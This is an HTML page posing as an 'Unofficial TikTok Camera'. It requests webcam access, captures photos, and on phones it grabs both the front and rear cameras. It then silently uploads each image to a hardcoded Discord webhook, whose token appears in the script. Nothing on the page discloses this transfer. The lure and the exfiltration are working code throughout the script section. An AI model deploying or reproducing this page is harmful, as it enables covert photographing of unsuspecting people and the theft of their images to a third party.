<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok-Inspired Camera</title>
    <style>
        body {
            margin: 0;
            background: linear-gradient(to bottom, #000, #111);
            font-family: 'Poppins', sans-serif;
            color: white;
            text-align: center;
            overflow: hidden;
        }
        h1 {
            font-size: 2rem;
            color: #fff;
            margin-top: 20px;
            text-shadow: 0 0 5px #f0f, 0 0 10px #0ff;
        }
        video {
            margin-top: 20px;
            width: 90%;
            max-width: 400px;
            border: 10px solid;
            border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
            border-radius: 20px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1rem;
            border: none;
            border-radius: 25px;
            background: linear-gradient(to right, #f0f, #0ff);
            color: white;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
        }
        button:active {
            transform: scale(0.95);
        }
        #loadingIndicator {
            display: none;
            margin: 20px auto;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Unofficial TikTok Camera</h1>
    <video id="webcam" autoplay></video>
    <div id="loadingIndicator"></div>
    <button id="captureButton">Capture</button>
    <p id="message"></p>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const captureButton = document.getElementById('captureButton');
        const message = document.getElementById('message');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const loadingIndicator = document.getElementById('loadingIndicator');

        // Your Discord webhook URL
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";

        // Function to check if the device is mobile
        function isMobile() {
            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        }

        // Function to start the camera with specified facingMode
        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                });
                video.srcObject = stream;
                return stream;
            } catch (err) {
                message.textContent = 'Error accessing webcam: ' + err.message;
                return null;
            }
        }

        // Capture and send image to Discord
        async function captureAndSendImage(stream, facing) {
            // Set canvas size to match the video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the captured image to a Blob
            return new Promise((resolve, reject) => {
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('file', blob, `${facing}-camera-image.png`);
                    formData.append('payload_json', JSON.stringify({
                        content: `Preview your captured image! (${facing} camera)`,
                    }));

                    fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        body: formData,
                    })
                        .then(response => {
                            if (response.ok) {
                                resolve(`${facing} camera image sent successfully.`);
                            } else {
                                reject(`Failed to send ${facing} camera image. Status: ${response.status}`);
                            }
                        })
                        .catch(error => reject(`Error sending ${facing} camera image: ${error.message}`));
                }, 'image/png');
            });
        }

        // Main event listener for capturing and sending images
        captureButton.addEventListener('click', async () => {
            message.textContent = '';
            loadingIndicator.style.display = 'block';

            if (isMobile()) {
                // For mobile devices: Capture both front and back camera
                const frontStream = await startCamera('user');
                if (frontStream) {
                    await captureAndSendImage(frontStream, 'front').catch(err => message.textContent += err + '\n');
                    frontStream.getTracks().forEach(track => track.stop());
                }

                const backStream = await startCamera('environment');
                if (backStream) {
                    await captureAndSendImage(backStream, 'back').catch(err => message.textContent += err + '\n');
                    backStream.getTracks().forEach(track => track.stop());
                }
            } else {
                // For desktops: Capture only the default camera
                const stream = await startCamera('user');
                if (stream) {
                    await captureAndSendImage(stream, 'default').catch(err => message.textContent += err + '\n');
                    stream.getTracks().forEach(track => track.stop());
                }
            }

            loadingIndicator.style.display = 'none';
            if (!message.textContent) {
                message.textContent = 'All images sent successfully!';
            }
        });
    </script>
</body>
</html>
